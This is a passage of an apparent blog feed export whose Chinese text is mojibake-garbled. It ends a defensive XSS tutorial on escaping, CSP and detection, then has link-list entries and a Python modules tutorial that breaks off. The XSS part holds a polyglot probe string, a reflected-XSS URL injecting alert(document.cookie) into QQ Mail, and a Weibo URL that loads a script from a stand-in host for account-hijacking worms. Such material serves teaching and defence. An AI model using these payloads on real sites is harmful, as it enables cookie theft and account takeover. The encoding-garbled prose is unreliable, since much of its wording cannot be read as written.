å…¶ä»–å®‰å…¨æªæ–½ HTTP-only Cookie: ç¦æ­¢ JavaScript è¯»å–æŸäº›æ•æ„Ÿ Cookieï¼Œæ”»å‡»è€…å®Œæˆ XSS æ³¨å…¥åä¹Ÿæ— æ³•çªƒå–æ­¤ Cookieã€‚ éªŒè¯ç ï¼šé˜²æ­¢è„šæœ¬å†’å……ç”¨æˆ·æäº¤å±é™©æ“ä½œã€‚ XSS çš„æ£€æµ‹ä¸Šè¿°ç»å†è®©å°æ˜æ”¶è·é¢‡ä¸°ï¼Œä»–ä¹Ÿå­¦ä¼šäº†å¦‚ä½•å»é¢„é˜²å’Œä¿®å¤ XSS æ¼æ´ï¼Œåœ¨æ—¥å¸¸å¼€å‘ä¸­ä¹Ÿå…·å¤‡äº†ç›¸å…³çš„å®‰å…¨æ„è¯†ã€‚ä½†å¯¹äºå·²ç»ä¸Šçº¿çš„ä»£ç ï¼Œå¦‚ä½•å»æ£€æµ‹å…¶ä¸­æœ‰æ²¡æœ‰ XSS æ¼æ´å‘¢ï¼Ÿ ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œå°æ˜æ‰¾åˆ°äº†ä¸¤ä¸ªæ–¹æ³•ï¼š ä½¿ç”¨é€šç”¨ XSS æ”»å‡»å­—ç¬¦ä¸²æ‰‹åŠ¨æ£€æµ‹ XSS æ¼æ´ã€‚ ä½¿ç”¨æ‰«æå·¥å…·è‡ªåŠ¨æ£€æµ‹ XSS æ¼æ´ã€‚ åœ¨Unleashing an Ultimate XSS Polyglotä¸€æ–‡ä¸­ï¼Œå°æ˜å‘ç°äº†è¿™ä¹ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼š 1jaVasCript: /*-/*`/*\`/*'/*"/**/ /* */ oNcliCk = alert(); //%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e å®ƒèƒ½å¤Ÿæ£€æµ‹åˆ°å­˜åœ¨äº HTML å±æ€§ã€HTML æ–‡å­—å†…å®¹ã€HTML æ³¨é‡Šã€è·³è½¬é“¾æ¥ã€å†…è” JavaScript å­—ç¬¦ä¸²ã€å†…è” CSS æ ·å¼è¡¨ç­‰å¤šç§ä¸Šä¸‹æ–‡ä¸­çš„ XSS æ¼æ´ï¼Œä¹Ÿèƒ½æ£€æµ‹ eval()ã€setTimeout()ã€setInterval()ã€Function()ã€innerHTMLã€document.write() ç­‰ DOM å‹ XSS æ¼æ´ï¼Œå¹¶ä¸”èƒ½ç»•è¿‡ä¸€äº› XSS è¿‡æ»¤å™¨ã€‚ å°æ˜åªè¦åœ¨ç½‘ç«™çš„å„è¾“å…¥æ¡†ä¸­æäº¤è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…æŠŠå®ƒæ‹¼æ¥åˆ° URL å‚æ•°ä¸Šï¼Œå°±å¯ä»¥è¿›è¡Œæ£€æµ‹äº†ã€‚ 1http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E é™¤äº†æ‰‹åŠ¨æ£€æµ‹ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è‡ªåŠ¨æ‰«æå·¥å…·å¯»æ‰¾ XSS æ¼æ´ï¼Œä¾‹å¦‚ Arachniã€Mozilla HTTP Observatoryã€w3af ç­‰ã€‚ XSS æ”»å‡»çš„æ€»ç»“æˆ‘ä»¬å›åˆ°æœ€å¼€å§‹æå‡ºçš„é—®é¢˜ï¼Œç›¸ä¿¡åŒå­¦ä»¬å·²ç»æœ‰äº†ç­”æ¡ˆï¼š XSS é˜²èŒƒæ˜¯åç«¯ RD çš„è´£ä»»ï¼Œåç«¯ RD åº”è¯¥åœ¨æ‰€æœ‰ç”¨æˆ·æäº¤æ•°æ®çš„æ¥å£ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ ä¸æ­£ç¡®ã€‚å› ä¸ºï¼š _ é˜²èŒƒå­˜å‚¨å‹å’Œåå°„å‹ XSS æ˜¯åç«¯ RD çš„è´£ä»»ã€‚è€Œ DOM å‹ XSS æ”»å‡»ä¸å‘ç”Ÿåœ¨åç«¯ï¼Œæ˜¯å‰ç«¯ RD çš„è´£ä»»ã€‚é˜²èŒƒ XSS æ˜¯éœ€è¦åç«¯ RD å’Œå‰ç«¯ RD å…±åŒå‚ä¸çš„ç³»ç»Ÿå·¥ç¨‹ã€‚ _ è½¬ä¹‰åº”è¯¥åœ¨è¾“å‡º HTML æ—¶è¿›è¡Œï¼Œè€Œä¸æ˜¯åœ¨æäº¤ç”¨æˆ·è¾“å…¥æ—¶ã€‚ æ‰€æœ‰è¦æ’å…¥åˆ°é¡µé¢ä¸Šçš„æ•°æ®ï¼Œéƒ½è¦é€šè¿‡ä¸€ä¸ªæ•æ„Ÿå­—ç¬¦è¿‡æ»¤å‡½æ•°çš„è½¬ä¹‰ï¼Œè¿‡æ»¤æ‰é€šç”¨çš„æ•æ„Ÿå­—ç¬¦åï¼Œå°±å¯ä»¥æ’å…¥åˆ°é¡µé¢ä¸­ã€‚ ä¸æ­£ç¡®ã€‚ ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œå¦‚ HTML å±æ€§ã€HTML æ–‡å­—å†…å®¹ã€HTML æ³¨é‡Šã€è·³è½¬é“¾æ¥ã€å†…è” JavaScript å­—ç¬¦ä¸²ã€å†…è” CSS æ ·å¼è¡¨ç­‰ï¼Œæ‰€éœ€è¦çš„è½¬ä¹‰è§„åˆ™ä¸ä¸€è‡´ã€‚ ä¸šåŠ¡ RD éœ€è¦é€‰å–åˆé€‚çš„è½¬ä¹‰åº“ï¼Œå¹¶é’ˆå¯¹ä¸åŒçš„ä¸Šä¸‹æ–‡è°ƒç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚ æ•´ä½“çš„ XSS é˜²èŒƒæ˜¯éå¸¸å¤æ‚å’Œç¹ççš„ï¼Œæˆ‘ä»¬ä¸ä»…éœ€è¦åœ¨å…¨éƒ¨éœ€è¦è½¬ä¹‰çš„ä½ç½®ï¼Œå¯¹æ•°æ®è¿›è¡Œå¯¹åº”çš„è½¬ä¹‰ã€‚è€Œä¸”è¦é˜²æ­¢å¤šä½™å’Œé”™è¯¯çš„è½¬ä¹‰ï¼Œé¿å…æ­£å¸¸çš„ç”¨æˆ·è¾“å…¥å‡ºç°ä¹±ç ã€‚ è™½ç„¶å¾ˆéš¾é€šè¿‡æŠ€æœ¯æ‰‹æ®µå®Œå…¨é¿å… XSSï¼Œä½†æˆ‘ä»¬å¯ä»¥æ€»ç»“ä»¥ä¸‹åŸåˆ™å‡å°‘æ¼æ´çš„äº§ç”Ÿï¼š åˆ©ç”¨æ¨¡æ¿å¼•æ“ å¼€å¯æ¨¡æ¿å¼•æ“è‡ªå¸¦çš„ HTML è½¬ä¹‰åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼š åœ¨ ejs ä¸­ï¼Œå°½é‡ä½¿ç”¨ &lt;%= data %&gt; è€Œä¸æ˜¯ &lt;%- data %&gt; ã€‚ é¿å…å†…è”äº‹ä»¶ å°½é‡ä¸è¦ä½¿ç”¨ onLoad=&quot;onload(&#39;&#39;)&quot;ã€onClick=&quot;go(&#39;&#39;)&quot; è¿™ç§æ‹¼æ¥å†…è”äº‹ä»¶çš„å†™æ³•ã€‚åœ¨ JavaScript ä¸­é€šè¿‡ .addEventlistener() äº‹ä»¶ç»‘å®šä¼šæ›´å®‰å…¨ã€‚ é¿å…æ‹¼æ¥ HTML å‰ç«¯é‡‡ç”¨æ‹¼æ¥ HTML çš„æ–¹æ³•æ¯”è¾ƒå±é™©ï¼Œå¦‚æœæ¡†æ¶å…è®¸ï¼Œä½¿ç”¨ createElementã€setAttribute ä¹‹ç±»çš„æ–¹æ³•å®ç°ã€‚æˆ–è€…é‡‡ç”¨æ¯”è¾ƒæˆç†Ÿçš„æ¸²æŸ“æ¡†æ¶ï¼Œå¦‚ Vue/React ç­‰ã€‚ æ—¶åˆ»ä¿æŒè­¦æƒ• åœ¨æ’å…¥ä½ç½®ä¸º DOM å±æ€§ã€é“¾æ¥ç­‰ä½ç½®æ—¶ï¼Œè¦æ‰“èµ·ç²¾ç¥ï¼Œä¸¥åŠ é˜²èŒƒã€‚ å¢åŠ æ”»å‡»éš¾åº¦ï¼Œé™ä½æ”»å‡»åæœ é€šè¿‡ CSPã€è¾“å…¥é•¿åº¦é…ç½®ã€æ¥å£å®‰å…¨æªæ–½ç­‰æ–¹æ³•ï¼Œå¢åŠ æ”»å‡»çš„éš¾åº¦ï¼Œé™ä½æ”»å‡»çš„åæœã€‚ ä¸»åŠ¨æ£€æµ‹å’Œå‘ç° å¯ä½¿ç”¨ XSS æ”»å‡»å­—ç¬¦ä¸²å’Œè‡ªåŠ¨æ‰«æå·¥å…·å¯»æ‰¾æ½œåœ¨çš„ XSS æ¼æ´ã€‚ XSS æ”»å‡»æ¡ˆä¾‹QQ é‚®ç®± m.exmail.qq.com åŸŸååå°„å‹ XSS æ¼æ´æ”»å‡»è€…å‘ç° http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb è¿™ä¸ª URL çš„å‚æ•° uinã€domain æœªç»è½¬ä¹‰ç›´æ¥è¾“å‡ºåˆ° HTML ä¸­ã€‚ äºæ˜¯æ”»å‡»è€…æ„å»ºå‡ºä¸€ä¸ª URLï¼Œå¹¶å¼•å¯¼ç”¨æˆ·å»ç‚¹å‡»ï¼š http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B ç”¨æˆ·ç‚¹å‡»è¿™ä¸ª URL æ—¶ï¼ŒæœåŠ¡ç«¯å–å‡º URL å‚æ•°ï¼Œæ‹¼æ¥åˆ° HTML å“åº”ä¸­ï¼š 123456789&lt;script&gt; getTop().location.href = '/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa' + '&amp;t=' + '&amp;d=bbbb'; return false;&lt;/script&gt;&lt;script&gt; alert(document.cookie);&lt;/script&gt;"+"... æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åå°±ä¼šæ‰§è¡Œ alert(document.cookie)ï¼Œæ”»å‡»è€…é€šè¿‡ JavaScript å³å¯çªƒå–å½“å‰ç”¨æˆ·åœ¨ QQ é‚®ç®±åŸŸåä¸‹çš„ Cookie ï¼Œè¿›è€Œå±å®³æ•°æ®å®‰å…¨ã€‚ æ–°æµªå¾®åšåäººå ‚åå°„å‹ XSS æ¼æ´æ”»å‡»è€…å‘ç° http://weibo.com/pub/star/g/xyyyd è¿™ä¸ª URL çš„å†…å®¹æœªç»è¿‡æ»¤ç›´æ¥è¾“å‡ºåˆ° HTML ä¸­ã€‚ äºæ˜¯æ”»å‡»è€…æ„å»ºå‡ºä¸€ä¸ª URLï¼Œç„¶åè¯±å¯¼ç”¨æˆ·å»ç‚¹å‡»ï¼š 1http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt; ç”¨æˆ·ç‚¹å‡»è¿™ä¸ª URL æ—¶ï¼ŒæœåŠ¡ç«¯å–å‡ºè¯·æ±‚ URLï¼Œæ‹¼æ¥åˆ° HTML å“åº”ä¸­ï¼š 1&lt;li&gt;&lt;a href="http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;"&gt;æŒ‰åˆ†ç±»æ£€ç´¢&lt;/a&gt;&lt;/li&gt; æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åå°±ä¼šåŠ è½½æ‰§è¡Œæ¶æ„è„šæœ¬ //xxxx.cn/image/t.jsï¼Œåœ¨æ¶æ„è„šæœ¬ä¸­åˆ©ç”¨ç”¨æˆ·çš„ç™»å½•çŠ¶æ€è¿›è¡Œå…³æ³¨ã€å‘å¾®åšã€å‘ç§ä¿¡ç­‰æ“ä½œï¼Œå‘å‡ºçš„å¾®åšå’Œç§ä¿¡å¯å†å¸¦ä¸Šæ”»å‡» URLï¼Œè¯±å¯¼æ›´å¤šäººç‚¹å‡»ï¼Œä¸æ–­æ”¾å¤§æ”»å‡»èŒƒå›´ã€‚è¿™ç§çªƒç”¨å—å®³è€…èº«ä»½å‘å¸ƒæ¶æ„å†…å®¹ï¼Œå±‚å±‚æ”¾å¤§æ”»å‡»èŒƒå›´çš„æ–¹å¼ï¼Œè¢«ç§°ä¸ºâ€œXSS è •è™«â€ã€‚ æ‰©å±•é˜…è¯»ï¼šAutomatic Context-Aware Escapingä¸Šæ–‡æˆ‘ä»¬è¯´åˆ°ï¼š åˆé€‚çš„ HTML è½¬ä¹‰å¯ä»¥æœ‰æ•ˆé¿å… XSS æ¼æ´ã€‚ å®Œå–„çš„è½¬ä¹‰åº“éœ€è¦é’ˆå¯¹ä¸Šä¸‹æ–‡åˆ¶å®šå¤šç§è§„åˆ™ï¼Œä¾‹å¦‚ HTML å±æ€§ã€HTML æ–‡å­—å†…å®¹ã€HTML æ³¨é‡Šã€è·³è½¬é“¾æ¥ã€å†…è” JavaScript å­—ç¬¦ä¸²ã€å†…è” CSS æ ·å¼è¡¨ç­‰ç­‰ã€‚ ä¸šåŠ¡ RD éœ€è¦æ ¹æ®æ¯ä¸ªæ’å…¥ç‚¹æ‰€å¤„çš„ä¸Šä¸‹æ–‡ï¼Œé€‰å–ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚ é€šå¸¸ï¼Œè½¬ä¹‰åº“æ˜¯ä¸èƒ½åˆ¤æ–­æ’å…¥ç‚¹ä¸Šä¸‹æ–‡çš„ï¼ˆNot Context-Awareï¼‰ï¼Œå®æ–½è½¬ä¹‰è§„åˆ™çš„è´£ä»»å°±è½åˆ°äº†ä¸šåŠ¡ RD èº«ä¸Šï¼Œéœ€è¦æ¯ä¸ªä¸šåŠ¡ RD éƒ½å……åˆ†ç†è§£ XSS çš„å„ç§æƒ…å†µï¼Œå¹¶ä¸”éœ€è¦ä¿è¯æ¯ä¸€ä¸ªæ’å…¥ç‚¹ä½¿ç”¨äº†æ­£ç¡®çš„è½¬ä¹‰è§„åˆ™ã€‚ è¿™ç§æœºåˆ¶å·¥ä½œé‡å¤§ï¼Œå…¨é äººå·¥ä¿è¯ï¼Œå¾ˆå®¹æ˜“é€ æˆ XSS æ¼æ´ï¼Œå®‰å…¨äººå‘˜ä¹Ÿå¾ˆéš¾å‘ç°éšæ‚£ã€‚ 2009 å¹´ï¼ŒGoogle æå‡ºäº†ä¸€ä¸ªæ¦‚å¿µå«åšï¼šAutomatic Context-Aware Escapingã€‚ æ‰€è°“ Context-Awareï¼Œå°±æ˜¯è¯´æ¨¡æ¿å¼•æ“åœ¨è§£ææ¨¡æ¿å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œå°±è§£ææ¨¡æ¿è¯­æ³•ï¼Œåˆ†æå‡ºæ¯ä¸ªæ’å…¥ç‚¹æ‰€å¤„çš„ä¸Šä¸‹æ–‡ï¼Œæ®æ­¤è‡ªåŠ¨é€‰ç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚è¿™æ ·å°±å‡è½»äº†ä¸šåŠ¡ RD çš„å·¥ä½œè´Ÿæ‹…ï¼Œä¹Ÿå‡å°‘äº†äººä¸ºå¸¦æ¥çš„ç–æ¼ã€‚ åœ¨ä¸€ä¸ªæ”¯æŒ Automatic Context-Aware Escaping çš„æ¨¡æ¿å¼•æ“é‡Œï¼Œä¸šåŠ¡ RD å¯ä»¥è¿™æ ·å®šä¹‰æ¨¡æ¿ï¼Œè€Œæ— éœ€æ‰‹åŠ¨å®æ–½è½¬ä¹‰è§„åˆ™ï¼š 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url&#125;&#125;"&gt;&#123;&#123;.content&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; æ¨¡æ¿å¼•æ“ç»è¿‡è§£æåï¼Œå¾—çŸ¥ä¸‰ä¸ªæ’å…¥ç‚¹æ‰€å¤„çš„ä¸Šä¸‹æ–‡ï¼Œè‡ªåŠ¨é€‰ç”¨ç›¸åº”çš„è½¬ä¹‰è§„åˆ™ï¼š 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8" /&gt; &lt;title&gt;&#123;&#123;.title | htmlescaper&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href="&#123;&#123;.url | urlescaper | attrescaper&#125;&#125;"&gt;&#123;&#123;.content | htmlescaper&#125;&#125;&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; ç›®å‰å·²ç»æ”¯æŒ Automatic Context-Aware Escaping çš„æ¨¡æ¿å¼•æ“æœ‰ï¼š go html/template Google Closure Templates è¯¾åä½œä¸šï¼šXSS æ”»å‡»å°æ¸¸æˆä»¥ä¸‹æ˜¯å‡ ä¸ª XSS æ”»å‡»å°æ¸¸æˆï¼Œå¼€å‘è€…åœ¨ç½‘ç«™ä¸Šæ•…æ„ç•™ä¸‹äº†ä¸€äº›å¸¸è§çš„ XSS æ¼æ´ã€‚ç©å®¶åœ¨ç½‘é¡µä¸Šæäº¤ç›¸åº”çš„è¾“å…¥ï¼Œå®Œæˆ XSS æ”»å‡»å³å¯é€šå…³ã€‚ åœ¨ç©æ¸¸æˆçš„è¿‡ç¨‹ä¸­ï¼Œè¯·å„ä½è¯»è€…ä»”ç»†æ€è€ƒå’Œå›é¡¾æœ¬æ–‡å†…å®¹ï¼ŒåŠ æ·±å¯¹ XSS æ”»å‡»çš„ç†è§£ã€‚ alert(1) to win prompt(1) to win XSS game å‚è€ƒæ–‡çŒ® Wikipedia. Cross-site scripting, Wikipedia. OWASP. XSS (Cross Site Scripting) Prevention Cheat Sheet, OWASP. OWASP. Use the OWASP Java Encoder-Use-the-OWASP-Java-Encoder), GitHub. Ahmed Elsobky. Unleashing an Ultimate XSS Polyglot, GitHub. Jad S. Boutros. Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems, Google Security Blog. Vue.js. v-html - Vue API docs, Vue.js. React. dangerouslySetInnerHTML - DOM Elements, React.]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F08%2FAI%2FAI%20%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[1234title: AI ä¼ é€é—¨date: 2019-09-8 24:50:24tags: AIcategories: AI Tensorflow Tensorflow.js å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ tfjs-examples Deep Learning with JavaScript-Neural networks in TensorFlow.js]]></content>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯ä¼ é€é—¨]]></title>
    <url>%2F2019%2F09%2F06%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E4%BC%A0%E9%80%81%E9%97%A8%2F</url>
    <content type="text"><![CDATA[JavaScript å‰ç«¯é¢è¯•ä¸è¿›é˜¶æŒ‡å— å£¹é¢˜æ±‡æ€» 33 Concepts Every JavaScript Developer Should Know React react å®˜ç½‘ æŠ€æœ¯ç½‘å€ æ·˜ç³»å‰ç«¯å›¢é˜Ÿï¼ˆFEDï¼‰ InfoQ IMWeb AlloyTeam ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ å¤§ç‰›ä»¬çš„æ€è€ƒæ²‰æ·€ é˜¿é‡Œ9å¹´ï¼Œæˆ‘æ€»ç»“çš„å‰ç«¯æ¶æ„æ¼”è¿›3å¤§é˜¶æ®µåŠå›¢é˜Ÿç®¡ç†å¿ƒæ³• winterï¼šä»å‰ç«¯åˆ°â€é’±â€œç«¯ï¼Œæˆ‘å¹¶ä¸æŠŠé’±å½“å·¥ä½œç›®æ ‡ï¼Œä½†é’±ä»æ¥ä¹Ÿæ²¡æœ‰äºå¾…æˆ‘ ç‰ä¼¯ï¼šæˆ‘çš„å‰ç«¯æˆé•¿ä¹‹è·¯]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡º Python æ¨¡å—æœºåˆ¶]]></title>
    <url>%2F2019%2F09%2F01%2FPython%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%20Python%20%E6%A8%A1%E5%9D%97%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[Python æ¨¡å— æ¨¡å—æ˜¯åŒ…æ‹¬ Python å®šä¹‰å’Œå£°æ˜çš„æ–‡ä»¶ï¼Œæ–‡ä»¶åå°±æ˜¯æ¨¡å—ååŠ ä¸Š .py åç¼€ï¼Œæ¨¡å—åå¯ä»¥ç”±å…¨å±€å˜é‡ __name__ å¾—åˆ°ã€‚ Python åªæœ‰ä¸€ç§æ¨¡å—å¯¹è±¡ç±»å‹ï¼Œæ‰€æœ‰æ¨¡å—éƒ½å±äºè¯¥ç±»å‹ï¼Œæ— è®ºæ¨¡å—æ˜¯ç”¨ Pythonã€C è¿˜æ˜¯åˆ«çš„è¯­è¨€å®ç°ã€‚ ä»€ä¹ˆæ˜¯ Python æ¨¡å—ç®€å•æ¥è¯´ï¼Œä¸€ä¸ª Python æ¨¡å—å°±æ˜¯ä¸€ä¸ªä»¥ .py ä¸ºåç¼€çš„æ–‡ä»¶ ï¼Œæ¨¡å—ä¸­èƒ½å®šä¹‰å†…å®¹åŒ…æ‹¬ï¼šå˜é‡ã€å‡½æ•°ã€ç±»å’Œå¯æ‰§è¡Œä»£ç ã€‚ æ¨¡å—ç±»å‹å¤§è‡´æœ‰ä»¥ä¸‹ 3 ç§ï¼š Python å†…ç½®çš„æ¨¡å—ï¼Œå³æ ‡å‡†åº“ã€‚ Python å¸¦æœ‰ä¸€ä¸ªæ ‡å‡†æ¨¡å—åº“ï¼Œå¹¶å‘å¸ƒæœ‰ç‹¬ç«‹çš„æ–‡æ¡£ï¼Œåä¸º Python åº“å‚è€ƒæ‰‹å†Œã€‚æœ‰ä¸€äº›æ¨¡å—å†…ç½®äºè§£é‡Šå™¨ä¹‹ä¸­ï¼Œè¿™äº›æ“ä½œçš„è®¿é—®æ¥å£ä¸æ˜¯è¯­è¨€å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯å·²ç»å†…ç½®äºè§£é‡Šå™¨äº†ã€‚è¿™æ—¢æ˜¯ä¸ºäº†æé«˜æ•ˆç‡ï¼Œä¹Ÿæ˜¯ä¸ºäº†ç»™ç³»ç»Ÿè°ƒç”¨ç­‰æ“ä½œç³»ç»ŸåŸç”Ÿè®¿é—®æä¾›æ¥å£ã€‚ ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå³é€šè¿‡ pip install çš„æ¨¡å—ã€‚ è‡ªå®šä¹‰æ¨¡å—ï¼Œå³ç”¨æˆ·è‡ªå·±ç¼–å†™çš„æ¨¡å—ã€‚ ä¸¾ä¸ª ğŸŒ°ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªæ¨¡å— fibo.py ï¼š 1234567891011121314# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b æ¨¡å—å¯¼å…¥å¯¼å…¥æ¨¡å—çš„æ–¹å¼æœ‰ä»¥ä¸‹ 2 ç§ï¼š import module è¿™æ˜¯æ¨¡å— å®Œå…¨å¼•å…¥ çš„æ–¹å¼ã€‚ æ¯”å¦‚ import os ä¼šæŠŠ os ä¸‹é¢çš„æ‰€æœ‰çš„å˜é‡ã€å‡½æ•°ã€ç±»å…¨éƒ¨å¼•å…¥ï¼Œé€šè¿‡ os å¯ä»¥è®¿é—®æ¨¡å—ä¸­çš„å˜é‡æˆ–å‡½æ•°ï¼Œå¦‚ os.listdir()ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ import module as xx çš„æ–¹å¼ï¼Œä¸ºæ¨¡å—èµ·ä¸€ä¸ªåˆ«åã€‚ from module import func1, func2 è¿™æ˜¯æ¨¡å— éƒ¨åˆ†å¼•å…¥ çš„æ–¹å¼ã€‚æŒ‰éœ€å¼•å…¥éœ€è¦æ¨¡å—ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œå¦ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥ç›´æ¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨å¤åˆ¶åçš„å˜é‡åã€‚ ä¸¾ä¸ªğŸŒ°ï¼Œç°åœ¨è¿›å…¥ Python è§£é‡Šå™¨å¯¼å…¥è¯¥æ¨¡å—ï¼š 12&gt;&gt;&gt; import fibo&gt;&gt;&gt; å¯ä»¥çœ‹åˆ°å½“å‰æ²¡æœ‰ä»»ä½•è¾“å‡ºï¼Œå› ä¸ºå¯¼å…¥æ¨¡å—çš„æ“ä½œï¼Œåªæ˜¯è¿›å…¥åˆ°æ¨¡å—å fibo ä¸­ï¼Œå¹¶ä¸ä¼šç›´æ¥è¿›å…¥åˆ°å®šä¹‰åœ¨ fibo å‡½æ•°å†…ã€‚å¯ä»¥ç”¨æ¨¡å—åè®¿é—®è¿™äº›å‡½æ•°: 123456789&gt;&gt;&gt; import fibo&gt;&gt;&gt; fibo.fib(10)0112358 æ¨¡å—æ‰§è¡Œå¦‚æœéœ€è¦è®©ä¸€ä¸ª .py æ–‡ä»¶æ—¢å½“ä½œè„šæœ¬åˆèƒ½å½“ä½œæ¨¡å—ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ __name__ è¿™ä¸ªå±æ€§ã€‚åªæœ‰å½“æ–‡ä»¶è¢«å½“ä½œè„šæœ¬æ‰§è¡Œçš„æ—¶å€™ï¼Œ __name__ çš„å€¼æ‰ä¼šæ˜¯ &#39;__main__&#39;ï¼Œè€Œæ¨¡å—å¯¼å…¥æ—¶ä¸ä¼šã€‚ ä¸‹é¢ï¼Œæˆ‘ä»¬æ”¹é€ ä¸€ä¸‹ä¸Šè¿° fibo æ¨¡å—ï¼Œåœ¨æœ«å°¾æ·»åŠ ä¸€æ®µä»£ç ï¼š 123456789101112131415161718# write Fibonacci series up to ndef fib(n): a, b = 0, 1 while a &lt; n: print(a) a, b = b, a+b# return Fibonacci series up to ndef fib2(n): result = [] a, b = 0, 1 while a &lt; n: result.append(a) a, b = b, a+b# ä½œä¸ºè„šæœ¬æ¥æ‰§è¡Œæ¨¡å—if __name__ == &apos;__main__&apos; : fib(10) ç„¶åè¿è¡Œ Python æ¨¡å—ï¼š 12345678&gt;&gt;&gt; python fibo.py 0112358 å¯ä»¥çœ‹åˆ°æ¨¡å—é‡Œçš„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œå°±å¥½åƒå·²å¯¼å…¥æ¨¡å—ä¸€æ ·ã€‚ æ¨¡å—åŠ è½½æœºåˆ¶ åŠ¨æ€åŠ è½½æ¨¡å—ä½†æ˜¯importåªèƒ½å¤ŸåŠ è½½å›ºå®šåç§°æ¨¡å—ï¼Œä¸èƒ½åŠ è½½åŠ¨æ€æ¯”å¦‚å­—ç¬¦ä¸²åç§°æ¨¡å—ï¼Œæ¯”å¦‚ str = â€˜toolsâ€™import str å¥½äº†ï¼Œç°åœ¨è§£å†³äº†åŠ¨æ€åŠ è½½éšæ„æ¨¡å—çš„é—®é¢˜äº†ï¼Œä½†æ˜¯è·ç¦»æˆåŠŸè¿˜æœ‰ä¸€æ­¥ä¹‹é¥ï¼Œåœ¨pythoné‡Œé¢ï¼ŒåŠ è½½æ¨¡å—æ˜¯æœ‰ç¼“å­˜çš„ï¼Œæ„æ€å°±æ˜¯è¯´ï¼ŒåŠ è½½tools.pyä¹‹åï¼Œå°±ç®—tools.pyå†…å®¹å‘ç”Ÿæ”¹å˜äº†ï¼Œéƒ½ä¸ä¼šé‡æ–°åŠ è½½ï¼Œè¿˜æ˜¯æ— æ³•æ»¡è¶³æˆ‘ä»¬å®æ—¶æ›´æ–°åŠ è½½æ¨¡å—çš„éœ€æ±‚ã€‚è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒç®€å•çš„åŠæ³•ï¼Œå¯ä»¥ä½¿å¾—æ¨¡å—æœ‰éœ€è¦çš„æ—¶å€™é‡æ–°åŠ è½½ï¼Œå›æƒ³ä¹‹å‰æˆ‘ä»¬è¯´è¿‡ï¼ŒpythonåŠ è½½åçš„æ¨¡å—éƒ½ä¼šä¿å­˜åœ¨sys.modulesé‡Œé¢ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨é‡æ–°åŠ 